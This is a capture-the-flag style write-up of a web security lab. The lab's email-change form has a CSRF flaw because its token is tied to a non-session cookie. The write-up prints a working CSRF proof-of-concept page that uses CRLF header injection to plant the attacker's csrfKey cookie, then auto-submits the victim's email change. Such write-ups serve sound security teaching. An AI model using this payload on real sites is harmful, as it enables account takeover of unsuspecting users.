## Vulnerability Summary

The app's email change functionality is vulnerable to Cross-site Request Forgery (CSRF). Though it uses anti-CSRF tokens to try to prevent CSRF attacks, the token in `csrfKey` parameter isn't tied to user session, meaning an attacker can use their own legitimate, unexpired `CSRF` and `csrfKey` tokens to perform state-changing actions on any arbitrary account.
## Reconnaissance

After logging in with the provided credentials `wiener - peter`, observe that there is a header `Cookie: session=random-token`. 
- Try deleting this `Cookie` header, or changing the value of the parameter `session` inside it and sending the request will result in a `302 Found` HTTP Response, signifying a redirection. When we follow this redirection, we get a `200 OK` HTTP Response but **logged out** of our account. However, when the `Cookie` header with its previous correct `session` value is put back into the request, we are logged in again.
This confirms that the app solely relies on this `Cookie` header for session handling, using it to identify the user who has made the requests. 
Performing the same recon process as [Lab: CSRF where token is not tied to user session](../lab-token-not-tied-to-user-session/writeup.md), we get a `400 Bad Request` HTTP Response that reads `"Invalid CSRF token"`, even though the token wasn't consumed. However, the email changing request goes through successfully if together with `wiener`'s CSRF token, we use the valid, unexpired `csrfKey` too. This token is being used to handle sessions.
We have to find a way to inject the `csrfKey` parameter, but we cannot do it the same way as the `csrf` parameter because rather than being treated in the request body as form data, `csrfKey` is in the `Cookie` header of the request. 
- Using a random alphanumeric string to search (`aaa`), we notice that the server's response reflect our string in the `Set-Cookie` header: `Set-Cookie: LastSearchTerm=aaa; Secure; HttpOnly`. This is the perfect vector to inject our `csrfKey` parameter.
## Exploitation Steps 

1. Log in with the provided credentials (`wiener - peter`). Intercept the request to change your email address (`POST /my-account/change-email`), and send it to Repeater. **Drop** the request - do not let it pass through. `wiener`'s account email should remain unchanged.
2. In the Repeater tab, right click on the **dropped** request -> Engagement tools -> Generate CSRF PoC. **IMPORTANT**: you must change the value of the email address in this generated HTML. If not, you will still be using the email address you changed into in your account for the victim's account, which wouldn't work. The generated HTML should look something like this:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://lab-id.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="aaaaa&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="token-value" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
3.  Modify the submission `<script` block. We are going to use a XSS payload to inject our `csrfKey` parameter. The final HTML payload should look like:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://lab-id.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="assd&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="token-value" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://lab-id.net/?search=aaa%0d%0aSet-Cookie:%20csrfKey=token-value%3B%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```
4. Send the request. Lab is marked as solved. Observe that in the Access log (in the exploit server), the victim has visited the `/exploit` endpoint, which successfully triggered our payload.
## Payload Used

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://lab-id.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="assd&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="token-value" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://lab-id.net/?search=aaa%0d%0aSet-Cookie:%20csrfKey=token-value%3B%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```
The payload forces the authenticated victim's browser to execute a state changing action, which in this case is the email changing functionality at the `/my-account/change-email` endpoint. The valid, unexpired CSRF token that we obtained from the request of a state-changing action is also injected as the input. The input field is hidden to make the page appears as normal, `<input type="submit" value="Submit request" />` is for if the victim's browser has JavaScript disabled (not applicable in this case). Finally, we inject the malicious URL through the `src` attribute in the `<img>` tag, with `document.forms[0].submit` in the event `onerror` (which is triggered automatically because the response is not a valid image file), selecting the first `<form>` element in the DOM and triggers its submission. 

The injected URL `https://lab-id.net/?search=aaa%0d%0aSet-Cookie:%20csrfKey=token-value%3B%20SameSite=None` works like this: after the normal search term `aaa`, we inject the URL encoded `CRLF` character (`%0d%0a`) to create a newline in the header section of the response. On this newline, we perform the URL-encoded command `Set-Cookie: csrfKey=token-value; SameSite=None` to set the `csrfKey` parameter to our value and automatically add it in the cross-site request (with `SameSite=None`) that the simulated victim makes.
## Root Cause

The app reflects the user-supplied input from the `search` parameter into the `Set-Cookie` header in the response, allowing us to inject our `csrfKey` parameter. Together with the `csrf` parameter, this combination of tokens bypassed the session check.
## Remediation

- Bind the CSRF token directly to the user's authenticated session. The server should store the token (or its hash) in the server-side session object and validate incoming tokens against that authoritative record, rather than relying on a secondary, user-modifiable cookie.
- Sanitize all user input reflected in HTTP headers by stripping or URL-encoding CRLF characters to prevent header injection. Modern web frameworks handle this automatically; ensure the application uses standard framework APIs for setting headers rather than manually concatenating strings.
